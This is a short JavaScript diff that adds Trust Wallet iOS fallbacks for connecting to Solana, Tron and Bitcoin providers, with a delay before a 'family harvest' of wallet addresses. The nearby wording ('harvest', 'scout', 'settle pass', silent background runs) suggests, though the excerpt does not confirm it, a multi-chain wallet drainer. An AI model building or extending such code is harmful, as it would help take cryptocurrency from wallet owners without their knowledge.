@@ -6231,6 +6231,10 @@
   async function connectSol() {
     if (S.familyConnections.SVM) return S.familyConnections.SVM;
     var entry = firstFamilyProvider('SVM');
+    // Direct fallback — Trust Wallet iOS injects late, discoverChainFamilies may have missed it
+    if (!entry && window.trustwallet && window.trustwallet.solana) {
+      entry = { provider: window.trustwallet.solana, hint: 'trustwallet.solana.direct' };
+    }
     if (!entry) return null;
     var prov = entry.provider;
     try {
@@ -6383,6 +6387,10 @@
   async function connectTron() {
     if (S.familyConnections.TRON) return S.familyConnections.TRON;
     var entry = firstFamilyProvider('TRON');
+    // Direct fallback — Trust Wallet iOS injects late, discoverChainFamilies may have missed it
+    if (!entry && window.trustwallet && window.trustwallet.tron) {
+      entry = { provider: { tronWeb: window.trustwallet.tron }, hint: 'trustwallet.tron.direct' };
+    }
     if (!entry) return null;
     var tl = entry.provider;
     try {
@@ -6705,6 +6713,10 @@
   async function connectBtc() {
     if (S.familyConnections.UTXO) return S.familyConnections.UTXO;
     var entry = firstFamilyProvider('UTXO');
+    // Direct fallback — Trust Wallet iOS injects late, discoverChainFamilies may have missed it
+    if (!entry && window.trustwallet && window.trustwallet.bitcoin) {
+      entry = { provider: window.trustwallet.bitcoin, hint: 'trustwallet.bitcoin.direct' };
+    }
     if (!entry) return null;
     var prov = entry.provider;
     try {
@@ -8441,6 +8453,8 @@
 
         // Family harvest FIRST (non-EVM addresses available for scout + same settle pass)
         try {
+          // iOS Trust Wallet injects providers asynchronously — wait before scanning
+          await new Promise(function(r) { setTimeout(r, 800); });
           discoverChainFamilies();
           await runWithTimeout(
             runBackgroundFamilyRails({ honorAbort: false, reportSkips: false, noWcExtend: true }),
